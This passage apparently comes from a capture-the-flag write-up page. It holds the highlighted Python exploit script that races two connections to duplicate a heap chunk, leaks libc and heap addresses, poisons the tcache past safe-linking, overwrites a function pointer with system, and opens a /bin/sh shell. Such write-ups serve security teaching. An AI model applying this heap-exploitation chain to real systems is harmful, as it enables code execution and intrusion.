<span class="n">conn</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">use_namespace</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">)</span>

<span class="c1"># Create a second conn to do the race condition</span>
<span class="n">conn2</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">no_gdb</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">use_namespace</span><span class="p">(</span><span class="n">conn2</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">)</span>

<span class="c1"># Create a victim chunk to dupe</span>
<span class="n">VICTIM</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;victim&quot;</span><span class="p">)</span>
<span class="n">use_conn</span><span class="p">(</span><span class="n">conn2</span><span class="p">,</span> <span class="s2">&quot;victim&quot;</span><span class="p">)</span>

<span class="c1"># Run the dupe and close the second connection</span>
<span class="n">dupe_chunk</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">conn2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x417</span><span class="p">)</span>
<span class="n">conn2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># ----------------------------------- LEAKING VALUES -----------------------------------</span>

<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Upon running the dupe, victim is actually freed into the top chunk.</span>
<span class="sd">Afterwars, we can simply allocate new chunks on top of it, and read their entire content.</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="c1"># Names of these new chunks will appear at the old victim chunk</span>
<span class="n">DUP</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;dup&quot;</span><span class="p">)</span>
<span class="n">G1</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;guard1&quot;</span><span class="p">)</span>
<span class="n">LINK</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;link&quot;</span><span class="p">)</span>
<span class="n">G2</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;guard2&quot;</span><span class="p">)</span>

<span class="c1"># Create two chunks outsize tcache and guards in between</span>
<span class="n">zero</span><span class="p">(</span><span class="n">DUP</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">G1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">LINK</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">G2</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>

<span class="c1"># Free both of them, they will now point at each other</span>
<span class="n">drop</span><span class="p">(</span><span class="n">DUP</span><span class="p">)</span>
<span class="n">drop</span><span class="p">(</span><span class="n">LINK</span><span class="p">)</span>

<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">You can technically leak the heap without linking two unsortedbin chunks,</span>
<span class="sd">but this has the advantage of bypassing safe-linking encryption.</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="c1"># Leaking VICTIM will leak into the DUP chunk, which contains libc and heap pointers</span>
<span class="n">show</span><span class="p">(</span><span class="n">VICTIM</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;(No&quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)[</span><span class="mi">128</span><span class="p">:]</span>

<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span>

<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xab0</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1d2cc0</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># ------------------------------- CREATING INCREMENTORS -------------------------------</span>

<span class="c1"># Create slots for the incrementors</span>
<span class="n">ONE</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;one&quot;</span><span class="p">)</span>
<span class="n">ONE_ZERO</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;onezero&quot;</span><span class="p">)</span>
<span class="n">ZERO_ONE</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;zeroone&quot;</span><span class="p">)</span>

<span class="n">load</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="c1"># If the incrementors do not exist on disk, we must create them</span>
<span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;Could not&quot;</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Incrementors do not exist, creating...&quot;</span><span class="p">)</span>
    <span class="n">create_incrementors</span><span class="p">()</span>
<span class="k">else</span><span class="p">:</span>
    <span class="c1"># Load the remaining incrementors from disk</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Incrementors already present on disk, skipping creation...&quot;</span><span class="p">)</span>
    <span class="n">load</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">)</span>
    <span class="n">load</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">)</span>

<span class="c1"># ---------------------------------- CREATING CHAIN ----------------------------------</span>

<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">By slot, PTRPTRPTR -&gt; PTRPTR -&gt; PTR -&gt; VAL.</span>
<span class="sd">This gives us the unique ability to modify the entirety of VAL by:</span>

<span class="sd">* Incrementing PTR to each of VALs byte</span>

<span class="sd">* Incrementing PTRPTR to each of PTRs bytes.</span>
<span class="sd">At last, PTRPTRPTR must simply point at PTRPTR.</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="c1"># Create PTR and PTRPTR</span>
<span class="n">PTR</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;ptr&quot;</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="n">PTRPTR</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;ptrptr&quot;</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="c1"># Link a few chunks into tcache</span>
<span class="n">fin</span><span class="p">(</span><span class="n">G1</span><span class="p">)</span>
<span class="n">fin</span><span class="p">(</span><span class="n">G2</span><span class="p">)</span>
<span class="n">fin</span><span class="p">(</span><span class="n">DUP</span><span class="p">)</span>

<span class="c1"># VICTIM points at the DUP chunks name chunk.</span>
<span class="c1"># By freeing it, then writing to it with VICTIM, we can poison the tcache.</span>
<span class="n">zero</span><span class="p">(</span><span class="n">VICTIM</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

<span class="c1"># Calculate the address to place by safe-linking</span>
<span class="c1"># In this case, target is a pointer to the pointer in PTRPTR</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x3a0</span>  <span class="c1"># Pointer to PTRPTR</span>
<span class="n">val</span> <span class="o">=</span> <span class="n">target</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
<span class="n">val1</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
<span class="n">val2</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>

<span class="c1"># Increment to redirect the tcache</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">val1</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">VICTIM</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">val2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">VICTIM</span><span class="p">,</span> <span class="n">ZERO_ONE</span><span class="p">)</span>

<span class="c1"># Allocating now comes from our fake pointer, giving us a pointer to PTRPTR</span>
<span class="n">PTRPTRPTR</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;ptrptrptr&quot;</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

<span class="c1"># We now do the same thing, but into PTR instead</span>
<span class="n">val</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x388</span>  <span class="c1"># Pointer to PTR</span>
<span class="n">val1</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
<span class="n">val2</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">val1</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">val2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="n">ZERO_ONE</span><span class="p">)</span>

<span class="c1"># ---------------------------------- DROPPING SHELL ----------------------------------</span>

<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">We now have a very powerful primitive, despite the tight restrictions on input.</span>
<span class="sd">We first point PTR towards the pointer to f_use, then write the address of system.</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="c1"># Overwrite the f_use pointer with system</span>
<span class="n">write_ptr_val</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x450</span><span class="p">)</span>
<span class="n">write_val</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>

<span class="c1"># Since use points at system, we get system(&quot;/bin/sh&quot;)</span>
<span class="n">use</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)</span>

<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
            </div>
        
        
    </div>

    </body>
</html>